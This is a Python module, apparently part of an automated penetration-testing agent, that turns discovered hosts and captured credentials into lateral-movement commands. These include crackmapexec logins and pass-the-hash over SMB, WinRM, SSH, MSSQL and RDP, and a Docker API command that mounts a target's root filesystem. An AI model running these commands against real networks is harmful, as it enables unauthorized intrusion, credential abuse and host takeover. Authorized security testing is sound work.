"""Credential- and service-aware lateral movement proposals for the loop.

The planner consumes the world model (discovered hosts, open services and
captured credentials) and turns it into concrete, host-bound commands. It
never decides authorization: the caller filters every proposal through the
same scope helper the worker uses, so an out-of-scope host is dropped before
it becomes an intent. Commands are deterministic, quoted and IP-validated so
a credential or banner can never inject shell syntax.

The module is pure: no filesystem, no network, no imports from the loop.
"""

from __future__ import annotations

import ipaddress
import re
import shlex
from dataclasses import dataclass

MAX_PROPOSALS = 2
DEFAULT_PRIORITY = 6
SMB_SERVICE_PORTS = frozenset({445})
WINRM_SERVICE_PORTS = frozenset({5985, 5986})
SSH_SERVICE_PORTS = frozenset({22})
MSSQL_SERVICE_PORTS = frozenset({1433})
RDP_SERVICE_PORTS = frozenset({3389})
DOCKER_SERVICE_PORTS = frozenset({2375})
SMB_SERVICE_NAMES = frozenset({"smb", "microsoft-ds", "netbios-ssn", "samba"})
WINRM_SERVICE_NAMES = frozenset({"winrm", "wsman"})
SSH_SERVICE_NAMES = frozenset({"ssh", "openssh"})
MSSQL_SERVICE_NAMES = frozenset({"mssql", "ms-sql-s"})
RDP_SERVICE_NAMES = frozenset({"rdp", "ms-wbt-server", "terminal-services"})
DOCKER_SERVICE_NAMES = frozenset({"docker", "docker-api"})
_HASH_PATTERN = re.compile(r"^[0-9a-fA-F]{32}$")


@dataclass(frozen=True)
class LateralHost:
    """One discovered host the loop could move to.

    Attributes:
        ip: IPv4 literal of the host.
        ports: Open TCP ports observed on the host.
        services: Lowercase service names observed on the host.
        os_hint: ``linux``, ``windows`` or empty when unknown.
    """

    ip: str
    ports: tuple[int, ...] = ()
    services: tuple[str, ...] = ()
    os_hint: str = ""


@dataclass(frozen=True)
class LateralCredential:
    """One captured credential usable for lateral authentication.

    Attributes:
        user: Account name.
        secret: Password or hash.
        kind: ``password`` or ``hash``.
        host: Host the credential was captured on (empty when global).
        service: Service the credential belongs to (empty when unknown).
    """

    user: str
    secret: str
    kind: str = "password"
    host: str = ""
    service: str = ""


@dataclass(frozen=True)
class LateralProposal:
    """One host-bound lateral command ready to become an intent.

    Attributes:
        command: Full command line (without the ``run action:`` marker).
        host: Target host the command acts on.
        service: Service or vector the command exercises.
        priority: Planner priority (1-10).
        credential_user: Account used, empty when unauthenticated.
    """

    command: str
    host: str
    service: str
    priority: int = DEFAULT_PRIORITY
    credential_user: str = ""


def plan_lateral(
    hosts,
    credentials,
    *,
    pivot_prefix: str = "",
    limit: int = MAX_PROPOSALS,
    exclude=frozenset(),
) -> list[LateralProposal]:
    """Build lateral proposals from world-model hosts and credentials.

    Args:
        hosts: Host mappings (world-model ``hosts`` dict or host rows).
        credentials: Credential rows (world-model ``credentials`` list).
        pivot_prefix: Command prefix that routes traffic through the pivot.
        limit: Maximum proposals returned this round.
        exclude: Commands already proposed; matching proposals are skipped.

    Returns:
        Deduplicated proposals, host-specific credentials first and at most
        one vector per host so a round diversifies across the network.
    """
    parsed_hosts = _parse_hosts(hosts)
    parsed_creds = _parse_credentials(credentials)
    if not parsed_hosts:
        return []
    seen: set[str] = set(exclude or ())
    out: list[LateralProposal] = []
    for host in _rank_hosts(parsed_hosts, parsed_creds):
        for proposal in _host_proposals(host, parsed_creds, pivot_prefix):
            if proposal.command in seen:
                continue
            seen.add(proposal.command)
            out.append(proposal)
            if len(out) >= max(1, int(limit)):
                return out
            break
    return out


def _parse_hosts(hosts) -> list[LateralHost]:
    """Normalize the world-model host mapping into :class:`LateralHost` rows."""
    rows: list = []
    if isinstance(hosts, dict):
        for key, value in hosts.items():
            if isinstance(value, dict):
                rows.append({**value, "ip": value.get("ip") or key})
            else:
                rows.append({"ip": key})
    elif isinstance(hosts, (list, tuple)):
        rows = list(hosts)
    out: list[LateralHost] = []
    for row in rows:
        if isinstance(row, str):
            ip, ports, names, os_hint = row, (), (), ""
        elif isinstance(row, dict):
            ip = str(row.get("ip") or row.get("host") or "")
            ports, names = _parse_services(row.get("services"))
            os_hint = str(row.get("os_hint") or "").strip().lower()
        else:
            continue
        if not _is_ipv4(ip):
            continue
        out.append(LateralHost(ip=ip, ports=tuple(sorted(set(ports))), services=tuple(sorted(set(names))), os_hint=os_hint))
    return out


def _parse_services(raw) -> tuple[list[int], list[str]]:
    """Extract open ports and service names from a world-model services field."""
    ports: list[int] = []
    names: list[str] = []
    if isinstance(raw, dict):
        items = list(raw.items())
    elif isinstance(raw, (list, tuple)):
        items = [(None, item) for item in raw]
    else:
        return ports, names
    for key, value in items:
        port = key
        if isinstance(value, dict):
            port = value.get("port", key)
            name = value.get("name") or value.get("service") or ""
            if name:
                names.append(str(name).strip().lower())
        elif isinstance(value, str) and key is not None:
            names.append(value.strip().lower())
        elif key is None:
            port = value
        try:
            number = int(port)
        except (TypeError, ValueError):
            continue
        if 0 < number < 65536:
            ports.append(number)
    return ports, names


def _parse_credentials(credentials) -> list[LateralCredential]:
    """Normalize credential rows and drop malformed or empty secrets."""
    out: list[LateralCredential] = []
    for row in credentials or ():
        if isinstance(row, str):
            value, host, service = row, "", ""
        elif isinstance(row, dict):
            value = str(row.get("value") or "")
            host = str(row.get("host") or "")
            service = str(row.get("service") or "").strip().lower()
        else:
            value = str(getattr(row, "value", "") or "")
            host = str(getattr(row, "host", "") or "")
            service = str(getattr(row, "service", "") or "").strip().lower()
        user, separator, secret = value.partition(":")
        user = user.strip()
        secret = secret.strip()
        if not separator or not user or not secret:
            continue
        if user.lower() in _MARKER_USERS or secret.lower().startswith(_MARKER_SECRET_PREFIX):
            continue
        kind = "hash" if _HASH_PATTERN.match(secret) else "password"
        out.append(LateralCredential(user=user, secret=secret, kind=kind, host=host.strip(), service=service))
    return out


_MARKER_USERS = frozenset({"shell", "session", "meterpreter", "beacon"})
_MARKER_SECRET_PREFIX = "shell:"


def _rank_hosts(hosts: list[LateralHost], credentials: list[LateralCredential]) -> list[LateralHost]:
    """Order hosts by evidence strength: host-specific creds, docker, services."""

    def _score(host: LateralHost) -> tuple[int, int]:
        specific = sum(1 for cred in credentials if cred.host == host.ip)
        docker = int(bool(_docker_ports(host)))
        return (-specific, -docker)

    return sorted(hosts, key=_score)


def _host_proposals(host: LateralHost, credentials: list[LateralCredential], pivot_prefix: str) -> list[LateralProposal]:
    """Return the best proposal(s) for one host, strongest vector first."""
    prefix = f"{pivot_prefix.strip()} " if pivot_prefix and pivot_prefix.strip() else ""
    docker_ports = _docker_ports(host)
    if docker_ports:
        port = sorted(docker_ports)[0]
        no_proxy = f"NO_PROXY={host.ip} no_proxy={host.ip} "
        command = (
            f"{prefix}{no_proxy}docker -H tcp://{host.ip}:{port} run --rm "
            f"-v /:/mnt alpine sh -c 'id; hostname; ls /root 2>/dev/null | head'"
        )
        return [LateralProposal(command=command, host=host.ip, service="docker", priority=9)]
    out: list[LateralProposal] = []
    for service, ports, names, protocol, priority in _SERVICE_MATRIX:
        if not _host_has(host, ports, names):
            continue
        credential = _credential_for(host, credentials, service)
        if credential is None:
            continue
        command = _credential_command(host, credential, protocol, prefix)
        if command is None:
            continue
        out.append(
            LateralProposal(
                command=command,
                host=host.ip,
                service=service,
                priority=priority,
                credential_user=credential.user,
            )
        )
    return out


_SERVICE_MATRIX = (
    ("smb", SMB_SERVICE_PORTS, SMB_SERVICE_NAMES, "smb", 8),
    ("winrm", WINRM_SERVICE_PORTS, WINRM_SERVICE_NAMES, "winrm", 8),
    ("ssh", SSH_SERVICE_PORTS, SSH_SERVICE_NAMES, "ssh", 7),
    ("mssql", MSSQL_SERVICE_PORTS, MSSQL_SERVICE_NAMES, "mssql", 7),
    ("rdp", RDP_SERVICE_PORTS, RDP_SERVICE_NAMES, "rdp", 6),
)


def _host_has(host: LateralHost, ports: frozenset[int], names: frozenset[str]) -> bool:
    """Return True when the host exposes one of the ports or service names."""
    return bool(set(host.ports) & ports) or bool(set(host.services) & names)


def _docker_ports(host: LateralHost) -> set[int]:
    """Return open Docker API ports, including the conventional 2375."""
    ports = set(host.ports) & DOCKER_SERVICE_PORTS
    if set(host.services) & DOCKER_SERVICE_NAMES:
        ports.update(set(host.ports) & DOCKER_SERVICE_PORTS)
        if not ports and not host.ports:
            ports.add(2375)
    return ports


def _credential_for(
    host: LateralHost, credentials: list[LateralCredential], service: str
) -> LateralCredential | None:
    """Pick the strongest credential for a host and service.

    Priority: confirmed on this host and service, any on this host, then a
    global credential matching the service, then any global credential.
    """
    candidates = [
        cred
        for cred in credentials
        if cred.host in (host.ip, "") and cred.service in (service, "")
    ]
    if not candidates:
        return None
    candidates.sort(
        key=lambda cred: (
            cred.host != host.ip,
            cred.service != service,
            cred.kind != "password",
        )
    )
    return candidates[0]


def _credential_command(
    host: LateralHost, credential: LateralCredential, protocol: str, prefix: str
) -> str | None:
    """Build the protocol command, using ``-H`` only where hashes work."""
    user = shlex.quote(credential.user)
    if credential.kind == "hash":
        if protocol == "ssh":
            return None
        secret_flag = f"-H {shlex.quote(credential.secret)}"
    else:
        secret_flag = f"-p {shlex.quote(credential.secret)}"
    return f"{prefix}crackmapexec {protocol} {host.ip} -u {user} {secret_flag}"


def _is_ipv4(value: str) -> bool:
    """Return True when *value* is an IPv4 literal (the only accepted host)."""
    try:
        return ipaddress.ip_address(str(value or "").strip()).version == 4
    except ValueError:
        return False


__all__ = [
    "LateralCredential",
    "LateralHost",
    "LateralProposal",
    "MAX_PROPOSALS",
    "plan_lateral",
]
